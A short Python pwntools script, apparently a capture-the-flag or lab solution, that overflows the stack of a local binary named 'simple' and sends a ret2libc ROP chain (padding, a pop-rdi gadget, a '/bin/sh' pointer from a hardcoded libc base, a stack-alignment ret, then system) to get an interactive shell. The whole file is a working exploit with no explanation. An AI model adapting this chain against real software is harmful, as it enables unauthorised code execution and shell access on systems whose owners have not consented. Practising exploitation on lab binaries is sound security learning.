from pwn import *

TARGET = './simple'

elf = context.binary = ELF(TARGET)
#io = gdb.debug(TARGET)
io = process()

libc_base = 0x7ffff7dc8000
pop_rdi = p64(0x401223)
ret = p64(0x40101a)
system = p64(libc_base + 0x52290)
binsh = p64(libc_base + 0x1b45bd)

padding = cyclic(26, n=8)

payload = padding
payload += pop_rdi + binsh
payload += ret # align stack!
payload += system


io.clean()
io.sendline(payload)

io.interactive()
